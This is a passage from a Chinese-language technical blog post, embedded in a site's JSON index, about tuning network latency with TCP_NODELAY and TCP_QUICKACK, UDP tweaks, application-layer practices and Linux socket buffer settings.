参数是TCP_NODELAY，与延迟ACK关联的参数是TCP_QUICKACK，TCP_NODELAY针对的是数据发送方，TCP_QUICKACK针对的是数据接收方。 TCP_NODELAY：该参数设置后就是关闭了Nagle算法，即发送数据时不管包的大小，一律立即发送。 TCP_QUAICLACK: 该参数设置后表示关闭延迟ack, 表示接收到数据之后立即回复ACK。 观察下面这个案例，左侧是客户端，右侧是服务端，从下图可以看出，前面三次握手，以及第一次 HTTP 请求和响应还是挺快的，但第二次 HTTP 请求就比较慢了，特别是客户端在收到服务器第一个分组后，40ms 后才发出了 ACK 响应（图中蓝色行）。实际上，该延时是TCP 延迟确认（Delayed ACK）导致的，延时的时间就是TCP 延迟确认的最小超时时间40ms，这是个神奇的40ms，如果以后一看到40ms这个值时，需条件反射想到是否是delay ack或者是Nagle算法的40ms。 再看下面的案例：客户端需要发送2062字节数据，然后从服务器读取响应。 通过wireshark抓包，数据分成了1460字节和602字节两段发送。如图所示：发送第一段1460字节后，服务器等待40ms后才发送ACK；客户端也是收到ACK后才发送第二段的602字节。 现象看起来跟Nalge算法和ACK延迟确认机制相符。首先一次发送的数据量已经超过了MTU（2062 &gt; 1460），因此被分片了。客户端发送的第一段数据大小满足MSS，立即发送。服务器收到后因为要等待接收剩下的602个字节，所以没有发送响应数据，也就不能携带ACK，导致ACK延迟。客户端第二段602字节数据因为第一段数据没有确认而被延迟发送，直到40ms后收到ACK。因此条件反射想到是TCP_QUICKACK或者TCP_NODELAY没有开启，检查代码后发现确实TCP_QUICKACK和TCP_NODELAY都没开启，因此主动打开即可修复。 12recv(fd, rcvBuf, 132, 0); setsockopt(fd, IPPROTO_TCP, TCP_QUICKACK, (int[]){1}, sizeof(int)); 注意，TCP_QUICKACK需要在每次调用recv后重新设置，因为map tcp中明确提到该设置并非设置后就永久不变的： 针对数据发送方的禁用Nagle算法可以这个操作 1setsockopt(client_fd, SOL_TCP, TCP_NODELAY,(int[]){1}, sizeof(int)); TCP的延时确认以及Nagle算法，从思想看都是一致的，都是通过延迟发送来减轻网络传输负担。不用每次请求都发送一个网络包，而是先等一会儿（比如 40ms），看看有没有“顺风车”或者是否有还要发送的数据。如果这段时间内，正好有其他包需要发送，那就捎带着 ACK 或本次数据 一起发送过去。当然，如果一直等不到其他包，那就超时后单独发送。但是我们再网路负载不严重的情况下（比如在局域网内），ack delay和nagle算法对于我们来说并无太大意义，而且还增加了我们的网络延时。 在默认的情况下,Nagle算法和延迟ACK是默认开启，也就是说TCP_NODELAY和TCP_QUICKACK默认关闭。如果服务器开启延迟ACK、客户端开启Nagle算法 ，就很容易导致网络延迟增大。所以为了减少网络时延，可以开启TCP_NODELAY 和TCP_QUICKACK。 UDPUDP 提供了面向数据报的网络协议，它不需要网络连接，也不提供可靠性保障。所以，UDP 优化，相对于 TCP 来说，要简单得多。这里我也总结了常见的几种优化方案。 跟上篇套接字部分提到的一样，增大套接字缓冲区大小以及 UDP 缓冲区范围； 跟前面 TCP 部分提到的一样，增大本地端口号的范围； 根据 MTU 大小，调整 UDP 数据包的大小，减少或者避免分片的发生。 应用层应用层的网络协议优化，也是至关重要的一点。我总结了常见的几种优化方法。 使用长连接取代短连接，可以显著降低 TCP 建立连接的成本。在每秒请求次数较多时，这样做的效果非常明显。 使用内存等方式，来缓存不常变化的数据，可以降低网络 I/O 次数，同时加快应用程序的响应速度。 使用 Protocol Buffer 等序列化的方式，压缩网络 I/O 的数据量，可以提高应用程序的吞吐。 使用 DNS 缓存、预取、HTTPDNS 等方式，减少 DNS 解析的延迟，也可以提升网络 I/O 的整体速度。 I/O 多路复用技术 epoll 使用异步 I/O（Asynchronous I/O，AIO） 主进程 + 多个 worker 子进程。 听到相同端口的多进程模型。在这种模型下，所有进程都会监听相同接口，并且开启 SO_REUSEPORT 选项，由内核负责，把请求负载均衡到这些监听进程中去。 socket为了提高网络的吞吐量，你通常需要调整这些缓冲区的大小。比如： 增大每个套接字的缓冲区大小 net.core.optmem_max； 增大套接字接收缓冲区大小 net.core.rmem_max 和发送缓冲区大小 net.core.wmem_max； 增大 TCP 接收缓冲区大小 net.ipv4.tcp_rmem 和发送缓冲区大小 net.ipv4.tcp_wmem。 使用 SO_SNDBUF 和 SO_RCVBUF ，可以分别调整套接字发送缓冲区和接收缓冲区的大小。 内核选项的范围是全局的，套接字接口里面设置的是单个，如SO_SNDBUF设置得是当前socket发送缓冲区的大小。 总结 在应用程序中，主要是优化 I/O 模型、工作模型以及应用层的网络协议； 在套接字层中，主要是优化套接字的缓冲区大小； 在传输层中，主要是优化 TCP 和 UDP 协议； 在网络层中，主要是优化路由、转发、分片以及 ICMP 协议； 最后，在链路层中，主要是优化网络包的收发、网络功能卸载以及网卡选项。","link":"/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/"}],"tags":[{"name":"生活总结","slug":"生活总结","link":"/tags/%E7%94%9F%E6%B4%BB%E6%80%BB%E7%BB%93/"},{"name":"go","slug":"go","link":"/tags/go/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"网络协议","slug":"网络协议","link":"/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"Shell","slug":"Shell","link":"/tags/Shell/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"游戏开发","slug":"游戏开发","link":"/tags/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91/"},{"name":"内存","slug":"内存","link":"/tags/%E5%86%85%E5%AD%98/"},{"name":"成长","slug":"成长","link":"/tags/%E6%88%90%E9%95%BF/"},{"name":"编程框架","slug":"编程框架","link":"/tags/%E7%BC%96%E7%A8%8B%E6%A1%86%E6%9E%B6/"},{"name":"计算机网络","slug":"计算机网络","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"性能优化","slug":"性能优化","link":"/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"},{"name":"并行计算","slug":"并行计算","link":"/tags/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97/"}],"categories":[{"name":"生活","slug":"生活","link":"/categories/%E7%94%9F%E6%B4%BB/"},{"name":"技术","slug":"技术","link":"/categories/%E6%8A%80%E6%9C%AF/"},{"name":"工具","slug":"工具","link":"/categories/%E5%B7%A5%E5%85%B7/"}]}